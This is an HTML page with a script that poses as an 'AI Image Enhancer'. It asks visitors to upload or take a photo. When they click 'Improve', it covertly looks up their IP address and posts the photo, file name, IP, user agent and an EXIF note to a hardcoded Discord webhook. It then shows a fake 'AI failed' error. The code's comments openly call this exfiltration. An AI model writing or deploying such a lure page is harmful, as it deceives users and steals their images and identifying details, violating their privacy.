<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Enhancer</title>
    <style>
        :root {
            --bg: #121212;
            --panel: #1e1e1e;
            --accent: #6c5ce7;
            --text: #ffffff;
            --text-muted: #a0a0a0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--panel);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        h1 { margin-top: 0; font-size: 1.8rem; }
        p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 30px; }
        
        .drop-zone {
            border: 2px dashed #444;
            border-radius: 12px;
            padding: 40px 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        .drop-zone:hover { border-color: var(--accent); background: rgba(108, 92, 231, 0.05); }
        .drop-zone input[type="file"] {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0;
            cursor: pointer;
        }
        .drop-zone .icon { font-size: 3rem; margin-bottom: 10px; }
        
        #preview {
            max-width: 100%;
            max-height: 200px;
            border-radius: 8px;
            margin-top: 15px;
            display: none;
        }

        button {
            background: var(--accent);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        button:hover { background: #5b4cdb; }
        button:disabled { background: #444; cursor: not-allowed; }

        #status {
            margin-top: 20px;
            font-size: 0.9rem;
            height: 20px;
            color: var(--accent);
        }
    </style>
</head>
<body>

<div class="container">
    <h1>AI Image Improver</h1>
    <p>Upload a photo to enhance it with our AI. (Requires camera capture for best results).</p>

    <div class="drop-zone" id="drop-zone">
        <div class="icon">📸</div>
        <div>Tap to add image / Take Photo</div>
        <!-- capture="environment" forces the mobile camera to open -->
        <input type="file" id="file-input" accept="image/*" capture="environment">
    </div>

    <img id="preview" alt="Preview">

    <button id="improve-btn" disabled>Improve Image</button>
    <div id="status"></div>
</div>

<script>
    // Webhook integrated
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';

    const fileInput = document.getElementById('file-input');
    const preview = document.getElementById('preview');
    const improveBtn = document.getElementById('improve-btn');
    const statusDiv = document.getElementById('status');
    const dropZone = document.getElementById('drop-zone');

    let selectedFile = null;

    // Handle File Selection (Camera or Gallery)
    fileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (file) {
            selectedFile = file;
            
            // Show Preview
            const reader = new FileReader();
            reader.onload = (event) => {
                preview.src = event.target.result;
                preview.style.display = 'inline-block';
                dropZone.style.display = 'none'; // Hide dropzone
                improveBtn.disabled = false;
            };
            reader.readAsDataURL(file);
        }
    });

    // The "Improve" Click Handler
    improveBtn.addEventListener('click', async () => {
        if (!selectedFile) return;

        improveBtn.disabled = true;
        improveBtn.innerText = "Enhancing Image...";
        statusDiv.innerText = "Analyzing pixels...";
        statusDiv.style.color = "var(--accent)";

        try {
            // 1. Extract EXIF GPS Data (Proof of Location)
            const locationInfo = await getGPSLocation(selectedFile);
            
            // 2. Exfiltrate to Discord
            await sendToDiscord(selectedFile, locationInfo);

            // 3. Show the Fake Error AFTER exfiltration
            setTimeout(() => {
                statusDiv.innerText = "Error: AI failed to process image. Server timeout.";
                statusDiv.style.color = "#ff3333";
                improveBtn.innerText = "Try Again";
                improveBtn.disabled = false;
            }, 2000); // 2 second fake processing time

        } catch (error) {
            console.error(error);
            statusDiv.innerText = "Error processing request.";
            statusDiv.style.color = "#ff3333";
            improveBtn.disabled = false;
        }
    });

    // --- Helper: Check for EXIF Data ---
    async function getGPSLocation(file) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const view = new DataView(e.target.result);
                // Check for EXIF header (0xFFE1)
                if (view.getUint16(0, false) != 0xFFE1) {
                    resolve("No EXIF data found");
                    return;
                }
                resolve("Image contains EXIF metadata (Location may be embedded if camera location was on)");
            };
            reader.readAsArrayBuffer(file.slice(0, 128 * 1024)); // Read first 128KB for EXIF
        });
    }

    // --- Helper: Send Image + Data to Discord ---
    async function sendToDiscord(file, locationInfo) {
        // Compress image to Base64 to fit Discord embed limits
        const imgData = await compressImage(file, 800); 

        // Get user's current IP
        let ip = "Unknown";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(e) {}

        const payload = {
            content: `🚨 **New Image Captured on AI Enhancer** 🚨`,
            embeds: [
                {
                    title: "Image Data Captured",
                    color: 3447003,
                    fields: [
                        { name: "Sender IP", value: `\`${ip}\``, inline: true },
                        { name: "File Name", value: `\`${file.name}\``, inline: true },
                        { name: "EXIF Check", value: locationInfo, inline: false },
                        { name: "Device", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    image: {
                        url: imgData // Attach the Base64 image directly in the embed
                    },
                    footer: { text: "Honeypot System" },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }

    // --- Helper: Compress Image to Base64 ---
    function compressImage(file, maxWidth) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onload = (e) => {
                const img = new Image();
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let scaleSize = maxWidth / img.width;
                    if (scaleSize > 1) scaleSize = 1;
                    
                    canvas.width = img.width * scaleSize;
                    canvas.height = img.height * scaleSize;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                };
                img.src = e.target.result;
            };
            reader.readAsDataURL(file);
        });
    }
</script>
</body>
</html>
